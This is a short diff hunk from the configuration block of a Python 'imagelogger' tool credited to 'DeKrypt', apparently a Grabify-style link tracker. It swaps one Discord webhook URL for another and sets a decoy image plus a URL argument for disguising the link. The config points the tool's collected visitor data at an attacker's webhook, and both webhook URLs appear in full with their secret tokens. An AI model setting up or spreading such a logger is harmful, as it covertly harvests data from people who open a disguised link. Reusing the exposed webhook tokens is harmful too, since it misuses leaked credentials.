@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1161337833701769227/QvykCOrZ8bgT5J6WNP8JZ9DopIhMuhmwbCDMsQPbhOp5pirOCniynoyxElA1BNHNmXmm",
+    "webhook": "https://discord.com/api/webhooks/1222533771518148739/RKJF0UGVwvBZGkEj6WHqIil8fiKfcvCW4u-qPzY4cYYChLNm6_J5MgCnO2jJ0Aus60yc",
     "image": "https://static.wikia.nocookie.net/logopedia/images/e/e2/Grabify_2015.png/revision/latest?cb=20220515123419", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
